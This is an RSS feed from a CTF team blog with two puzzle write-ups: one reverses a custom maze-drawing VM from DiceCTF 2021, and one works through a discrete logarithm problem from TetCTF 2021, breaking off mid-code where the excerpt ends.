<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Black Bauhinia</title>
    <link>https://b6a.black/posts/</link>
    <description>Black Bauhinia (Posts)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 11 Feb 2021 02:01:00 +0800</lastBuildDate>
    
    <atom:link href="https://b6a.black/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>DiceCTF 2021: Lost in your Eyes</title>
      <link>https://b6a.black/posts/2021-02-09-dicectf-liye/</link>
      <pubDate>Thu, 11 Feb 2021 02:01:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2021-02-09-dicectf-liye/</guid>
      <description>&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Lost in Your Eyes&lt;/em&gt; is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Your eyes are like a maze, and I hate mazes, so help me escape.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given a binary which takes an input and outputs either &lt;code&gt;:)&lt;/code&gt; or &lt;code&gt;:(&lt;/code&gt;. If you win a smiley face on the remote server, you are additionally given the flag.&lt;/p&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;This challenge is solved by &lt;em&gt;harrier&lt;/em&gt; in collaboration with &lt;em&gt;Mystiz&lt;/em&gt;. The solution is written in the prespective of &lt;em&gt;harrier&lt;/em&gt;.&lt;/p&gt;
&lt;h3 id=&#34;part-i-reversing-the-virtual-machine&#34;&gt;Part I: Reversing the virtual machine&lt;/h3&gt;
&lt;p&gt;Since this is a reverse question with a binary, I decided to open it with IDA. This is a simple VM-type binary, with the instruction code stored directly inside.&lt;/p&gt;
&lt;p&gt;It looked so simple to me at the beginning, and I wonder why no one has solved it? After a bit of reversing and dynamically debugging, I know I was wrong.&lt;/p&gt;
&lt;p&gt;The code of the binary itself is simple. It is a simple VM with the below variables&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Eight one-byte &lt;em&gt;state registers&lt;/em&gt; ($R_0, R_1, &amp;hellip;, R_7$),&lt;/li&gt;
&lt;li&gt;a two-byte &lt;em&gt;instruction pointer&lt;/em&gt; ($p$),&lt;/li&gt;
&lt;li&gt;an one-byte &lt;em&gt;direction register&lt;/em&gt; ($d=1, 2, 3, 4$) deciding how the instruction pointer move,&lt;/li&gt;
&lt;li&gt;an one-byte &lt;em&gt;select register&lt;/em&gt; ($k$) deciding the index of register for subsequent operations, and&lt;/li&gt;
&lt;li&gt;65536 one-byte &lt;em&gt;memory&lt;/em&gt; ($M_0, M_1, &amp;hellip;, M_{65535}$) storing the instructions and data.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Moreover, each byte in the memory represents an instruction, and the instruction set is defined below.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Value&lt;/th&gt;
&lt;th&gt;Operation&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;em&gt;do nothing&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1 - 8&lt;/td&gt;
&lt;td&gt;$k \leftarrow 0$, &amp;hellip;, $k \leftarrow 7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9 - 16&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_0$, &amp;hellip;, $R_k \leftarrow R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_k + 1$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_k - 1$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;19&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6 + R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6 - R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;21&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6 \times R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow \text{floor}(R_6 / R_7)$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;23&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6\ \text{mod}\ R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;24&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow \text{~}R_k$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;25&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow -R_k$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6\ \text{and}\ R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;27&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6\ \text{or}\ R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;28&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6\ \text{xor}\ R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;29&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6 == R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow R_6 &amp;lt; R_7$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;31&lt;/td&gt;
&lt;td&gt;$256R_0+R_1 \leftarrow p, R_2 \leftarrow d$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;32&lt;/td&gt;
&lt;td&gt;&lt;em&gt;keycheck&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;33&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow M_{256R_0 + R_1}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;34&lt;/td&gt;
&lt;td&gt;$M_{256R_0 + R_1} \leftarrow R_k$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;35&lt;/td&gt;
&lt;td&gt;$p \leftarrow 256R_0 + R_1, d \leftarrow R_2$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;36&lt;/td&gt;
&lt;td&gt;$R_k \leftarrow \text{input}$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;37&lt;/td&gt;
&lt;td&gt;$\text{print}\ R_k$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;38 - 41&lt;/td&gt;
&lt;td&gt;$d \leftarrow 1$, &amp;hellip;, $d \leftarrow 4$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;em&gt;Keycheck&lt;/em&gt; is the only curious instruction, where I don&amp;rsquo;t really know why it even exists. While I was reversing, I am only able to realize it is used perform some fatal checks.&lt;/p&gt;
&lt;h3 id=&#34;part-ii-building-an-emulator&#34;&gt;Part II: Building an emulator&lt;/h3&gt;
&lt;p&gt;As the VM code is so simple, I decided to write an emulator in Python for ease of testing. It is not hard to write an emulation given that I have fully reversed the VM.&lt;/p&gt;
&lt;p&gt;Since the instruction code is embedded in the binary, I used &lt;em&gt;gef&lt;/em&gt; to extract the code part, and while in emulation I translate the code to human (me) readable instruction for further reverse. I thought I could get the flag by just reading and parsing the translated code, and figuring out the whole logic. I was wrong and it was far more complicated than that.&lt;/p&gt;
&lt;p&gt;With the emulator I was able to produce some code trace with various input, here&amp;rsquo;s some debug log I generated, with state of the VM and instruction it ran:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Current state: [0, 46, 1, 22, 41, 35, 23, 0] 6 50 / 16 0
50/16 REGSEL = 6
Current state: [0, 46, 1, 22, 41, 35, 24, 0] 6 49 / 16 0
49/16 LOAD REG[6] 0/46
Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 48 / 16 0
48/16 REGSEL = 7
Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 47 / 16 0
47/16 REG[7] = REG[6] == REG[7]
Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 16 0
46/16 KEYCHECK REG[7] OK
Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 16 3
45/16 SETMODE 3
Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 15 2
45/15 SETMODE 2
Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 15 2
47/15 REG[7] = REG[4]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;a/b&lt;/code&gt; is the notation I used to express instruction pointers, hereby $p = 256a + b$.&lt;/p&gt;
&lt;p&gt;I yield thousands of debug lines like the one above, and I tried to reverse the input process logic, and I realize there is a loop to detect what is my input, and it loop through to see whether the input matched those in the accepted characters.&lt;/p&gt;
&lt;p&gt;How the characters are matched? Only here I realize the meaning of the &lt;em&gt;keycheck&lt;/em&gt; operation. It is simply an &lt;em&gt;if&lt;/em&gt;: If the condition holds, the instruction pointer will move two steps forward. Otherwise it will move only one.&lt;/p&gt;
&lt;p&gt;Also, I was able to generate a list of possible inputs for the first byte, but then I was stuck and didn&amp;rsquo;t know how to do.&lt;/p&gt;
&lt;h3 id=&#34;part-iii-visualizing-the-inner-program&#34;&gt;Part III: Visualizing the inner program&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;This part is written in the prespective of Mystiz.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I decided to join &lt;em&gt;harrier&lt;/em&gt; on this challenge at some point of time. At that moment, he have reversed all of the VM and part of the inner program. I want to know what proportation of the inner program he has reversed.&lt;/p&gt;
&lt;p&gt;At first, I tried to use &lt;em&gt;graphviz&lt;/em&gt; for visualization. The results are pretty dull, and most nodes have both the in-degrees and out-degrees being one.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2021-02-09-dicectf-liye/graphviz.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;This is not surprising, since the nodes have out-degrees larger than one only if they are branches. However, one interesting point from this is, in most of the time, if &lt;code&gt;x1/y1&lt;/code&gt; transits to &lt;code&gt;x2/y2&lt;/code&gt;, then $|x_1-x_2|+|y_1+y_2|=1$&amp;hellip; Sounds like they are transited to adjacent grids in each instruction. I recalled some esolangs like &lt;em&gt;Piet&lt;/em&gt; and &lt;em&gt;Befunge&lt;/em&gt;, where the instruction pointers are actually 2D-coordinates. Although they are not equal, I had an idea to transform the whole thing into a two-dimensional grid. Well, maybe I should use HTML tables to visualize this. Since &lt;em&gt;harrier&lt;/em&gt; is tracing the instructions executed, I can integrate it and generate a heatmap to check what is being covered.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2021-02-09-dicectf-liye/html-viz.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Wow, this is pretty impressive. Now we can see that only a small proportion of the code in the inner program is visited. One thing that caught our attention is the &lt;em&gt;maze&lt;/em&gt; on the top-left corner. Well, it seemed impossible for us to traverse inside the maze, since there are no arrows and we are very likely unable to turn without arrows.&lt;/p&gt;
&lt;p&gt;We are able to identify a few &lt;em&gt;zones&lt;/em&gt; inside the internal program:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Request for input&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Payload area&lt;/li&gt;
&lt;li&gt;Loop structure&lt;/li&gt;
&lt;li&gt;The failing and the winning gadgets&lt;/li&gt;
&lt;li&gt;Maze&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;part-iv-generating-random-ideas&#34;&gt;Part IV: Generating random ideas&lt;/h3&gt;
&lt;p&gt;While testing with random inputs, it seemed that the input will be filling in 35/22, 35/23 and etc.&lt;/p&gt;
&lt;p&gt;My first idea is to see whether if we can overwrite 35/1 by overflowing the input buffer. I was expecting that the original code can be corrupted by writing up to 35/255, then it will be wrapped back to 35/0 and 35/1. Turns out this is not possible since only the bottom right zone, with dimensions $47\times34$, could be overwritten, filling line by line. The excessive input will simply be ignored.&lt;/p&gt;
&lt;p&gt;From the visualization, we can see that there are several &lt;em&gt;print&lt;/em&gt; gadgets. For example, there is a failing gadget (which prints &lt;code&gt;:(&lt;/code&gt;) on the bottom left input part that will be traversed when a character outside the character set is given. There is also one on the upper middle of the map and one in the top right. &lt;em&gt;Mystiz&lt;/em&gt; has identified that the former one has the same instructions as the one on the bottom left, so it would also be a failing gadget. The objective is simple: To make the instruction pointer end up on the top-right part, on the winning gadget.&lt;/p&gt;
&lt;p&gt;To achieve this, one idea we had is to find ways to jump to the winning gadget directly. We found that the instruction pointer will be moving into the &lt;em&gt;payload area&lt;/em&gt; when we are given a sufficiently long input. Therefore we can actually execute the payloads we sent.&lt;/p&gt;
&lt;p&gt;Knowing that, we tried to use the &lt;em&gt;set address&lt;/em&gt; instruction (byte 0x23) to jump to the win widget. Unfortunately this does not work, since &lt;code&gt;0x23&lt;/code&gt; is not allowed as an input.&lt;/p&gt;
&lt;p&gt;We then come up an idea to try to use the conditional &lt;em&gt;keycheck&lt;/em&gt; operation on the side of the square to escape out of the box. However &lt;em&gt;keycheck&lt;/em&gt; does not allow an arrow pointing to itself. This does not work as well.&lt;/p&gt;
&lt;p&gt;It seems that the only possible way is to navigate in the maze properly to get to the win gadget. But how is it possible if the maze do not have arrows?&lt;/p&gt;
&lt;p&gt;Well, there is an untouched part of the program - the arrow-putting gadget. With $R_4 &amp;lt; 4$, it can be used to put arrows on to the maze with the &lt;em&gt;set register&lt;/em&gt; instruction (byte 0x21). We reversed it and and expected that it behaves as the following Python code snippet:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; y &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;):
        &lt;span style=&#34;color:#75715e&#34;&gt;# We are not allowed to overwrite the &amp;#34;load address&amp;#34; instructions&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# i.e., the walls.&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; M[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; y] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x23&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; R[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
            M[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; y] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; R[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
            &lt;span style=&#34;color:#75715e&#34;&gt;# 0x26 0x27 0x28 0x29&lt;/span&gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;#   ↑    →    ↓    ←&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our objective is updated once again. Now the goal is to craft a payload to put appropriate arrows to let us navigate through the maze.&lt;/p&gt;
&lt;p&gt;But wait, there is a check after the maze. Basically, there are some instructions in the maze to write $R_3, R_4, R_5$ and $R_7$. All we need to do is to walk through the maze in a specific order to pass the check.&lt;/p&gt;
&lt;p&gt;So we finally have a clear target: design a route for the maze to pass through all the checks and get to the winning gadget.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2021-02-09-dicectf-liye/maze-path.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;part-v-crafting-a-smiley-face&#34;&gt;Part V: Crafting a smiley face&lt;/h3&gt;
&lt;p&gt;In each iteration, I can control 8 registers, initially with $R_0 = 0, R_1 = 5, R_6 = x$ and $R_7 = y$. Initially, I copied the coordinates by $R_2 \leftarrow x$ and $R_3 \leftarrow y$ for further operations. Moreover, $R_0$ and $R_1$ can be used to build up to an arbitrary number in a few instructions.&lt;/p&gt;
&lt;p&gt;The idea is to encode few arrows into a vertical block.&lt;/p&gt;
&lt;p&gt;However, the size of our input is pretty small. We need to make use of some techniques to save space. For instance, we can encode few arrows into one condition (Instead of checking &lt;code&gt;x == x0&lt;/code&gt; and &lt;code&gt;y == y0&lt;/code&gt;, we can use &lt;code&gt;y &amp;gt; y0&lt;/code&gt;, &lt;code&gt;y mod 6&lt;/code&gt; or even &lt;code&gt;x == y&lt;/code&gt; as long as it traverses to the goal).&lt;/p&gt;
&lt;p&gt;Writing the payload is tiring without some auxiliary tools, so I used spreadsheet to write the instructions and wrote a simple CSV parser to convert those instruction to the input payload. After some unknown hours of manual work, I have eventually crafted the payload. This is how it looks in spreadsheet. 🙈&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2021-02-09-dicectf-liye/spreadsheet.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;It is then converted as a payload to the binary. This is the emulated result that eventually returns a smiley face.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2021-02-09-dicectf-liye/maze-final.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;part-vi-final-thoughts&#34;&gt;Part VI: Final thoughts&lt;/h3&gt;
&lt;p&gt;It was really a fun reverse challenge, while being easy to begin yet challenging to finish. Every part of the challenge is well-designed. The maze, the constraints, and even the instructions that making this challenge to work. That was an exciting and mind-blowing experience to explore and dig into rabbit holes of the challenge bit by bit.&lt;/p&gt;
&lt;p&gt;Thanks to &lt;em&gt;Mystiz&lt;/em&gt; for the great insights and the visualization, I think having the visualization itself is already having half of the challenge solved. 😀&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>TetCTF 2021: unevaluated</title>
      <link>https://b6a.black/posts/2021-01-03-tetctf-unevaluated/</link>
      <pubDate>Sun, 03 Jan 2021 13:39:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2021-01-03-tetctf-unevaluated/</guid>
      <description>&lt;p&gt;TetCTF is the first CTF I have played in 2021. I recalled from last year that they have cool challenges. This year, there are three crypto challenges. In particular, &lt;em&gt;unevaluated&lt;/em&gt; is the hardest among them. Although I did not solve them, I dug into rabbit holes and had a lot of struggle, uh, fun.&lt;/p&gt;

&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;

&lt;p&gt;There is a 128-bit prime $p$. Define $\cdot: \mathbb{Z}_{p^2}^2\times\mathbb{Z}_{p^2}^2\rightarrow\mathbb{Z}_{p^2}^2$ by&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[(x_1, y_1)\cdot(x_2, y_2) := \left(\left(x_1x_2-y_1y_2\right)\ \text{mod}\ p^2, \left(x_1y_2+y_1x_2\right)\ \text{mod}\ p^2\right),\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;where $(x_1, y_1), (x_2, y_2) \in \mathbb{Z}_{p^2}^2$. Also, define for $k\in\mathbb{N}$ and $G \in \mathbb{Z}_{p^2}^2$, $G^k = G \cdot G \cdot ... \cdot G$. Given that $G, H \in \mathbb{Z}_{p^2}^2$, the objective is to find $k\in\mathbb{N}\cap\left[0, 2^{256}\right)$ such that $H = G^k$.&lt;/p&gt;

&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  &lt;strong&gt;Clickbaited!&lt;/strong&gt; This writeup is not original and has referred (or stolen) to several sources (Thanks rkm0959 and CryptoHack!). I would like to write this up for my own reference. Anyway, this is more like a story than a solution.
&lt;/div&gt;
  

&lt;h3 id=&#34;part-i-what-is-the-order-composed-of&#34;&gt;Part I: What is the order composed of?&lt;/h3&gt;

&lt;p&gt;Since $p$ and $k$ are respectively 128 and 256 bits long, it is expected to recover two out of $k\ \text{mod}\ p$, $k\ \text{mod}\ q$ and $k\ \text{mod}\ r$ to compute $k$. It is interesting to see the order being a product of three primes $p, q, r$, with $q | (p-1)$ and $r | (p+1)$.&lt;/p&gt;

&lt;p&gt;I have defined $\text{norm}: \mathbb{Z}_{p^2}^2 \rightarrow \mathbb{Z}_{p^2}$ by $\text{norm}(x, y) = (x^2 + y^2)\ \text{mod}\ p^2$ and experimented a bit and discovered some of the properties:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The imaginary part of $G^{pr}$ is zero.&lt;/li&gt;
&lt;li&gt;$\text{norm}(G^{pq}) = 1$, and&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If we are working on $\mathbb{Z}_p$ instead of $\mathbb{Z}_{p^2}^2$, then&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The imaginary part of $G^r$ is zero.&lt;/li&gt;
&lt;li&gt;$\text{norm}(G^q) = 1$, and&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following code snipped is used to verify the above properties.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Under mod n&lt;/span&gt;
P &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; complex_pow(G, p&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;r, n)           &lt;span style=&#34;color:#75715e&#34;&gt;# P.im == 0&lt;/span&gt;
dQ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; norm(complex_pow(G, p&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;q, n), n) &lt;span style=&#34;color:#75715e&#34;&gt;# dQ == 1&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# Under mod p&lt;/span&gt;
P &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; complex_pow(G, r, p)             &lt;span style=&#34;color:#75715e&#34;&gt;# P.im == 0&lt;/span&gt;
dQ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; norm(complex_pow(G, q, p), p)   &lt;span style=&#34;color:#75715e&#34;&gt;# dQ == 1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This make me think: If we consider a &lt;em&gt;polar coordinate representation&lt;/em&gt; where $G = \rho e^{i\theta}$, with $\rho\in R$ and $\theta\in A$, then $R \cong \mathbb{Z}_{pq}$ and $A \cong \mathbb{Z}_{pr}$. Hence, we can imagine that the subgroup that $G$ generates is isomorphic to $\mathbb{Z}_{pq}\times\mathbb{Z}_{pr}$.&lt;/p&gt;

&lt;div class=&#34;alert warning&#34;&gt;
  Well, they are not important though. This is interesting however.
&lt;/div&gt;
  

&lt;h3 id=&#34;part-ii-stealing-the-ideas-from-an-existing-cryptosystem&#34;&gt;Part II: Stealing the ideas from an existing cryptosystem&lt;/h3&gt;

&lt;p&gt;Solving discrete log under modulo $n^2$ does not seem difficult. For example, we can see from Paillier cryptosystem that discrete logarithms under modulo $n^2$ can be computed easily. In this way, we can compute $x\ \text{mod}\ p$ with:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[x \equiv \frac{\mathcal{L}(h^{p-1}\ \text{mod}\ p^2)}{\mathcal{L}(g^{p-1}\ \text{mod}\ p^2)}\ (\text{mod}\ p),\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;where $\mathcal{L}(x) = \frac{x-1}{p}$, like how a ciphertext is decrypted with the Paillier cryptosystem. Hence we have $x\ \text{mod}\ p$.&lt;/p&gt;

&lt;div class=&#34;alert info&#34;&gt;
  &lt;strong&gt;Mini Checklist&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; $x\ \text{mod}\ p$&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; $x\ \text{mod}\ q$&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; $x\ \text{mod}\ r$&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
  

&lt;h3 id=&#34;part-iii-solving-128bit-discrete-logarithm&#34;&gt;Part III: Solving 128-bit discrete logarithm&lt;/h3&gt;

&lt;p&gt;Let&#39;s try to work on $\mathbb{Z}_{p}^2$ instead of $\mathbb{Z}_{p^2}^2$. This reminded me the challenge &lt;em&gt;galiver&lt;/em&gt; in ASIS CTF Finals 2020. I searched the discussion on CryptoHack&#39;s Discord server, and found...&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2021-01-03-tetctf/hellman-on-galiver.png&#34;
         alt=&#34;hellman&amp;amp;rsquo;s comment on galiver back then.&#34;/&gt; &lt;figcaption&gt;
            &lt;p&gt;hellman&amp;rsquo;s comment on galiver back then.&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;


&lt;p&gt;Okay, &lt;em&gt;works for 128-bit $p$ rather fast&lt;/em&gt;. So this must be discrete logarithm. Let&#39;s try it? Since the imaginary part for $G^r, H^r$ are zero, I tried &lt;code&gt;discrete_log(H^r, G^r, q)&lt;/code&gt; on Sage. After five minutes, my PC crashed. I could not solve it during the CTF. After the game, rkm0959 publishes the &lt;a href=&#34;https://rkm0959.tistory.com/192&#34;&gt;writeup&lt;/a&gt; on the CTF and he used &lt;code&gt;h.log(g)&lt;/code&gt; and have got it working. In his writeup, he uses a &lt;em&gt;norm map&lt;/em&gt; which is isomorphic to the subgroup that $G^r$ generates.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;206109322179011817882783419945552366363&lt;/span&gt;
q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103054661089505908941391709972776183181&lt;/span&gt;
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17175776848250984823565284995462697197&lt;/span&gt;
G &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;20878314020629522511110696411629430299663617500650083274468525283663940214962&lt;/span&gt;,
     &lt;span style=&#34;color:#ae81ff&#34;&gt;16739915489749335460111660035712237713219278122190661324570170645550234520364&lt;/span&gt;)
H &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;11048898386036746197306883207419421777457078734258168057000593553461884996107&lt;/span&gt;,
